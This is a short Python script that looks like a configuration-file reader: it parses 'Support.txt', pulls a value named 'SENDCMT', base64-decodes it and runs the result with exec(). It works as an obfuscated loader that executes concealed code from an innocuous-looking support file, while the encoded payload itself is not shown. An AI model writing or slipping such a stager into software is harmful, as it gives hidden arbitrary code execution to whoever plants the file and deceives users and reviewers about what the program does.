import os
import base64

def load_variables(filename):
    variables = {}
    with open(filename, 'r') as file:
        for line in file:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if '=' in line:
                key, value = line.split('=', 1)
                variables[key.strip()] = value.strip()
            else:
                print(f"Warning: Line does not contain '=': {line}")
    return variables
config = load_variables('Support.txt')
GETCODE = config.get('SENDCMT')
if GETCODE:
    try:
        decoded_bytes = base64.b64decode(GETCODE)
        decoded_code = decoded_bytes.decode('utf-8')
        exec(decoded_code)
    except Exception as e:
        print(f"Error decoding or executing code: {e}")
